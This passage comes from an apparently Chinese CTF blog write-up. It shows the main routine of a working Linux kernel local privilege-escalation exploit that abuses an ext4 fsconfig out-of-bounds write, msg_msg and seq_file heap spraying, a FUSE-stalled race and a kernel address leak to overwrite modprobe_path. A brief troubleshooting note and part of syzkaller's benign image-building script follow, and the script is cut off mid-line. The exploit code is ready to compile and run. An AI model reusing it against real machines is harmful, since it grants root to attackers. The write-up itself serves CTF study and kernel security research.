fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fs_fd[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">char</span> m_ts_buf[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">int</span> seq_fd[SEQ_FILE_NUM];</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    unshare_setup(getuid(), getgid());</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_fd) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to open pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fuse_main(<span class="keyword">sizeof</span>(evil_args) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *) - <span class="number">1</span>, evil_args,</span><br><span class="line">                      &amp;evil_ops, <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;[-] FAILED to create FUSE!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ms_qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ms_qid &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&quot;\x00&quot;</span>, <span class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        ret = msgsnd(ms_qid, &amp;primary_msg, <span class="number">0xfd0</span> - <span class="number">8</span>, MSG_TAG);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ret);</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (msqid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray msg_msg in half of message queues and seq_files...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM / <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&#x27;A&#x27;</span> + i, <span class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        ret = msgsnd(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, MSG_TAG);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ret);</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fs_fd[<span class="number">0</span>] = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd[<span class="number">0</span>] &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to fsopen!&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">        fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;aaaaaaa&quot;</span>, <span class="string">&quot;bbbbbbb&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;0x196082&quot;</span>, <span class="string">&quot;pwned&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = MSG_QUEUE_NUM / <span class="number">2</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&#x27;A&#x27;</span> + i, <span class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, MSG_TAG) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] oob write to overwrite m_ts of one msg_msg...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(m_ts_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(m_ts_buf));</span><br><span class="line">    *((<span class="keyword">long</span> *)m_ts_buf) = <span class="number">0xfd0</span> + <span class="number">0xff0</span>;</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;196082196082196082ya7&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, m_ts_buf, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray more seq_operations...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = MSG_QUEUE_NUM; i &lt; SEQ_FILE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for oob reading...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> recv_size;</span><br><span class="line">        <span class="comment">// memset(buf, &#x27;\0&#x27;, 0xfd0 + 0xfd0);</span></span><br><span class="line">        recv_size = msgrcv(msqid[i], buf, <span class="number">0xfd0</span> + <span class="number">0xff0</span> - <span class="number">8</span> + <span class="number">0x10</span>, <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">        <span class="keyword">if</span> (recv_size &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error code :%d\n&quot;</span>, recv_size);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error index:%d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to msgrcv(MSG_COPY)!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (recv_size == (<span class="number">0xfd0</span> + <span class="number">0x18</span>))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; (<span class="number">0xfd0</span> + <span class="number">0xfd0</span>); j += <span class="number">8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)(buf + j) &gt; kernel_base &amp;&amp; (*(<span class="keyword">uint64_t</span> *)(buf + j) &amp; <span class="number">0xfff</span>) == <span class="number">0x140</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] get data leak: %p\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)(buf + j));</span><br><span class="line">                kernel_addr = *(<span class="keyword">uint64_t</span> *)(buf + j);</span><br><span class="line">                kernel_base = kernel_addr - <span class="number">0x36f140</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kernel_addr != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_addr == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to leak kernel base!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    modprobe_path = <span class="number">0xffffffff82891780</span> + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] modprobe_path: %lx\n&quot;</span>, modprobe_path);</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[<span class="number">1</span>], &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    prepare_mod();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> evil_file_fd;</span><br><span class="line">    <span class="keyword">int</span> ms_qid;</span><br><span class="line"></span><br><span class="line">    evil_file_fd = open(<span class="string">&quot;./temp/evil&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (evil_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to open evil file in FUSE!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *nearby_page = (<span class="keyword">char</span> *)mmap((<span class="keyword">void</span> *)<span class="number">0x1337000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *evil_page = (<span class="keyword">char</span> *)mmap((<span class="keyword">void</span> *)<span class="number">0x1338000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                                   MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (evil_page != (<span class="keyword">char</span> *)<span class="number">0x1338000</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to map for FUSE file!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(nearby_page, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;try %d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((ms_qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        exp_fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (exp_fs_fd &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to fsopen!&quot;</span>);</span><br><span class="line">        <span class="comment">// write(pipe_fd[1], &amp;exp_fs_fd, 4);</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">            fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;aaaaaaa&quot;</span>, <span class="string">&quot;bbbbbbb&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;0x196082&quot;</span>, <span class="string">&quot;pwned&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">pthread_t</span> thr;</span><br><span class="line">        pthread_create(&amp;thr, <span class="literal">NULL</span>, change_next, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(ms_qid, evil_page - <span class="number">0xfd0</span> + <span class="number">0x8</span>, <span class="number">0xfd0</span> + <span class="number">0x18</span>, MSG_TAG) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        pthread_join(thr, <span class="literal">NULL</span>);</span><br><span class="line">        i++;</span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (flag_fd &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Successfully overwrite the modprobe_path!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h3><p>首先在虚拟机中跑<code>FUSE</code>时踩了一个大坑，在一篇文章中( 这里提到的文章就不放出来了，可能是师傅们不小心写错了 )指出<code>FUSE</code>无法在ctf环境中运行是因为<code>bzImage</code>的问题，经过询问发现其问题主要是文件系统过于残缺导致的。随后听取a3佬的意见更多的学习了fuse原理之后成功解决了问题，我这里使用的是<code>syzkaller</code>中的工具使用<code>debootstrap</code>搭建的一个文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># Copyright 2016 syzkaller project authors. All rights reserved.</span></span><br><span class="line"><span class="comment"># Use of this source code is governed by Apache 2 LICENSE that can be found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create-image.sh creates a minimal Debian Linux image suitable for syzkaller.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eux</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a minimal Debian distribution in a directory.</span></span><br><span class="line">DIR=chroot</span><br><span class="line">PREINSTALL_PKGS=openssh-server,curl,tar,gcc,libc6-dev,time,strace,sudo,less,psmisc,selinux-utils,policycoreutils,checkpolicy,selinux-policy-default,firmware-atheros,debian-ports-archive-keyring,libselinux1-dev,fuse3,libfuse3-3,libfuse3-dev,libfuse2,libfuse-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># If ADD_PACKAGE is not defined as an external environment variable, use our default packages</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$&#123;ADD_PACKAGE+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">    ADD_PACKAGE=<span class="string">&quot;make,sysbench,git,vim,tmux,usbutils,tcpdump&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Variables affected by options</span></span><br><span class="line">ARCH=$(uname -m)</span><br><span class="line">RELEASE=bullseye</span><br><span class="line">FEATURE=minimal</span><br><span class="line">SEEK=2047</span><br><span class="line">PERF=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Display help function</span></span><br><span class="line"><span class="function"><span class="title">display_help</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> [option...] &quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -a, --arch                 Set architecture&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -d, --distribution         Set on which debian distribution to create&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -f, --feature              Check what packages to install in the image, options are minimal, full&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -s, --seek                 Image size (MB), default 2048 (2G)&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -h, --help                 Display help message&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -p, --add-perf             Add perf support with this option enabled. Please set envrionment variable \$KERNEL at first&quot;</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$#</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">        -h | --<span class="built_in">help</span>)</span><br><span class="line">            display_help</span><br><span class="line">            <span class="built_in">exit</span> 0</span><br><span class="line">        ;;</span><br><span class="line">        -a | --arch)</span><br><span class="line">            ARCH=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -d | --distribution)</span><br><span class="line">            RELEASE=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -f | --feature)</span><br><span class="line">            FEATURE=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -s | --seek)</span><br><span class="line">            SEEK=$((<span class="variable">$2</span> - <span class="number">1</span>))</span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -p | --add-perf)</span><br><span class="line">            PERF=<span class="literal">true</span></span><br><span class="line">            <span class="built_in">shift</span> 1</span><br><span class="line">        ;;</span><br><span class="line">        -*)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Error: Unknown option: <span class="variable">$1</span>&quot;</span> &gt;&amp;2</span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">        ;;</span><br><span class="line">        *)  <span class="comment"># No more options</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Handle cases where qemu and Debian use different arch names</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$ARCH</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    ppc64le)</span><br><span class="line">        DEBARCH=ppc64el</span><br><span class="line">    ;;</span><br><span class="line">    aarch64)</span><br><span class="line">        DEBARCH=arm64</span><br><span class="line">    ;;</span><br><span class="line">    arm)</span><br><span class="line">        DEBARCH=armel</span><br><span class="line">    ;;</span><br><span class="line">    x86_64)</span><br><span class="line">        DEBARCH=amd64</span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">        DEBARCH=<span class="variable">$ARCH</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Foreign architecture</span></span><br><span class="line"></span><br><span class="line">FOREIGN=<span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$ARCH</span> != $(uname -m) ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># i386 on an x86_64 host is exempted, as we can run i386 binaries natively</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$ARCH</span> != <span class="string">&quot;i386&quot;</span> -o $(uname -m) != <span class="string">&quot;x86_64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        FOREIGN=<span class="literal">true</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># Check for according qemu static binary</span></span><br><span class="line">    <span class="keyword">if</span> ! <span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Please install qemu static binary for architecture <span class="variable">$ARCH</span> (package &#x27;qemu-user-static&#x27; on Debian/Ubuntu/Fedora)&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="comment"># Check for according binfmt entry</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -r /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;binfmt entry /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> does not exist&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Double check KERNEL when PERF is enabled</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ] &amp;&amp; [ -z <span class="variable">$&#123;KERNEL+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Please set KERNEL environment variable when PERF is enabled&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If full feature is chosen, install more packages</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FEATURE</span> 